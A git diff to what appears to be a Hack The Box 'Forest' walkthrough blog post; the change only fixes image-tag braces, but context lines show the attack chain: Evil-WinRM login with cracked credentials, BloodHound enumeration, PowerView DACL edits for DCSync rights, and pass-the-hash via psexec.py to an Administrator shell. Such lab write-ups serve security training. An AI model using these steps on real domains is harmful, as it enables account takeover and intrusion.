@@ -345,7 +345,7 @@ Using the cracked credentials, logged into the machine with **Evil-WinRM** to ga
 evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
 ```
 
-![image.png]({ '/assets/img/Forest/image%202.png' | relative_url })
+![image.png]({{ '/assets/img/Forest/image%202.png' | relative_url }})
 
 After connecting, navigating to the **Desktop** directory reveals the flag file. Submitting this flag completes the initial challenge.
 
@@ -381,7 +381,7 @@ To understand the permissions and groups of the current user, I used the whoami 
 - Service Accounts - Used for services running on the machine.
 This combination of group memberships indicates the user may have substantial access within the domain, especially with Account Operators, which can manage user accounts within the domain.
 
-![image.png]({ '/assets/img/Forest/image.png' | relative_url })
+![image.png]({{ '/assets/img/Forest/image.png' | relative_url }})
 
 ### Active Directory Enumeration with BloodHound
 Using bloodhound-python to gather and visualize AD structure and relationships remotely, I ran the following command:
@@ -408,7 +408,7 @@ INFO: Done in 00M 49S
 
 ```
 The command enumerates users, groups, and ACLs in the domain, providing insight into the AD structure.
-![image.png]({ '/assets/img/Forest/image%201.png' | relative_url })
+![image.png]({{ '/assets/img/Forest/image%201.png' | relative_url }})
 **Key Findings:** The Account Operators group has GenericAll rights over the Exchange Windows Permissions group, which, in turn, has WriteDACL permissions on the domain object HTB.LOCAL. This escalation path can potentially allow privilege elevation by modifying the DACL on the domain object.
 
 ## Privilege Escalation
@@ -423,7 +423,7 @@ Given the GenericAll rights on Exchange Windows Permissions, I used the followin
    ```
 2. **Confirming Privilege Escalation**:
    Added **binary_exec** to **Remote Management Users** to enable remote login capabilities like WinRM.
-![image.png]({ '/assets/img/Forest/image%202.png' | relative_url })
+![image.png]({{ '/assets/img/Forest/image%202.png' | relative_url }})
 
 ### Modifying DACL for DCSync Privileges
 
@@ -435,7 +435,7 @@ With the **WriteDACL** permission on the domain object **HTB.LOCAL**, I used Pow
    ```bash
    *Evil-WinRM* PS C:\Users\binary_exec\Documents> upload /home/kali/Red_Team/Tools/PowerView.ps1
    ```
-   ![image.png]({ '/assets/img/Forest/image%203.png' | relative_url })
+   ![image.png]({{ '/assets/img/Forest/image%203.png' | relative_url }})
 2. **Executing PowerView to Modify ACL**:
    Two PowerShell commands were used to modify the ACL:
 ```bash
@@ -466,11 +466,11 @@ With the extracted NTLM hash for the Administrator account, I used **psexec.py**
 ```bash
 python3 /home/kali/Red_Team/Tools/impacket/examples/psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 ```
-![image.png]({ '/assets/img/Forest/image%204.png' | relative_url })
+![image.png]({{ '/assets/img/Forest/image%204.png' | relative_url }})
 
 This provided an Administrator shell, completing the privilege escalation process.
 
-![image.png]({ '/assets/img/Forest/image%205.png' | relative_url })
+![image.png]({{ '/assets/img/Forest/image%205.png' | relative_url }})
 
 ## Disclaimer:
 
